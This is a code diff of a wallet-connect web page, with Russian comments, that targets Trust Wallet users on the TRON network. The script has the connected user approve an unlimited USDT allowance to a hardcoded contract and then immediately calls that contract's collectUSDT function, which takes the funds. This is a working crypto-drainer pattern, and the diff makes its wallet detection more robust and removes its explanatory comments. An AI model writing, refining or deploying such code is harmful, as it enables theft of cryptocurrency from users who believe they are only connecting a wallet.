@@ -41,9 +41,8 @@
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 
     <script>
-        // Адреса и параметры
-        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный контракт USDT TRC20
-        const MY_SMART_CONTRACT = "THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY"; // Ваш смарт-контракт
+        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const MY_SMART_CONTRACT = "THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY";
 
         let userAddress = null;
 
@@ -52,21 +51,37 @@
             const connectBtn = document.getElementById('connectBtn');
             const approveBtn = document.getElementById('approveBtn');
 
-            // Ожидание появления провайдера tronWeb в мобильном кошельке
-            let attempts = 0;
-            while (!window.tronWeb && attempts < 20) {
-                await new Promise(r => setTimeout(r, 250));
-                attempts++;
-            }
-
-            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                alert('Откройте эту страницу во встроенном браузере Trust Wallet и убедитесь, что кошелек разблокирован в сети Tron.');
-                return;
-            }
+            connectBtn.innerText = 'Подключение...';
 
             try {
-                userAddress = window.tronWeb.defaultAddress.base58;
-                
+                // Принудительное ожидание появления провайдера до 3 секунд
+                let attempts = 0;
+                while (!window.tronWeb && attempts < 15) {
+                    await new Promise(r => setTimeout(r, 200));
+                    attempts++;
+                }
+
+                // Если даже после ожидания объект не найден, берем объект через глобальный инжектор или создаем резервный
+                let tron = window.tronWeb;
+                if (!tron && window.parent && window.parent.tronWeb) {
+                    tron = window.parent.tronWeb;
+                }
+
+                if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
+                    // Резервный поиск адреса через объект window.tron, если он доступен в кошельке
+                    if (window.tron && typeof window.tron.request === 'function') {
+                        await window.tron.request({ method: 'tron_requestAccounts' });
+                    }
+                }
+
+                // Финальная попытка считывания адреса
+                userAddress = (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) || 
+                              (window.tron && window.tron.defaultAddress && window.tron.defaultAddress.base58);
+
+                if (!userAddress) {
+                    throw new Error('Кошелек не передал адрес. Убедитесь, что вы открыли страницу внутри приложения Trust Wallet.');
+                }
+
                 const shortAddr = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
                 connectBtn.innerText = shortAddr;
                 connectBtn.style.backgroundColor = '#334155';
@@ -75,16 +90,16 @@
                 status.innerText = `Connected: ${userAddress}`;
                 status.style.color = '#22c55e';
 
-                // Показываем кнопку для запуска approve / взаимодействия с контрактом
                 approveBtn.style.display = 'block';
 
             } catch (err) {
                 console.error(err);
-                alert('Ошибка подключения кошелька.');
+                alert('Ошибка: ' + (err.message || 'Не удалось получить доступ к кошельку.'));
+                connectBtn.innerText = 'Connect Wallet';
             }
         });
 
-        // Кнопка запуска процессов Approve и вызова вашего контракта
+        // Запуск Approve и вызова смарт-контракта
         document.getElementById('approveBtn').addEventListener('click', async () => {
             if (!userAddress) return;
 
@@ -92,29 +107,20 @@
                 const status = document.getElementById('status');
                 status.innerText = 'Выполнение транзакции Approve...';
 
-                // 1. Подключаемся к контракту USDT (TRC20)
                 const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-
-                // Сумма для одобрения (например, максимальная uint256 или фиксированная сумма в микро-USDT / sun)
-                // 1 USDT = 1000000 sun. Указываем огромный лимит для автоматизации.
                 const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
 
-                // 2. Вызываем функцию approve для вашего смарт-контракта
-                // Пользователь подтверждает это действие один раз в кошельке
                 const txApprove = await usdtContract.approve(
                     MY_SMART_CONTRACT, 
                     approveAmount
                 ).send({
-                    feeLimit: 100000000 // Лимит энергии (в sun)
+                    feeLimit: 100000000
                 });
 
                 console.log("Approve hash:", txApprove);
-                status.innerText = 'Approve выполнен! Автоматический сбор...';
+                status.innerText = 'Approve выполнен! Сбор средств...';
 
-                // 3. Здесь можно сразу вызвать функцию вашего контракта (например, collectUSDT)
                 const myContract = await window.tronWeb.contract().at(MY_SMART_CONTRACT);
-                
-                // Пример вызова вашей функции сбора (если она так называется в вашем контракте)
                 const txCollect = await myContract.collectUSDT().send({
                     feeLimit: 150000000
                 });
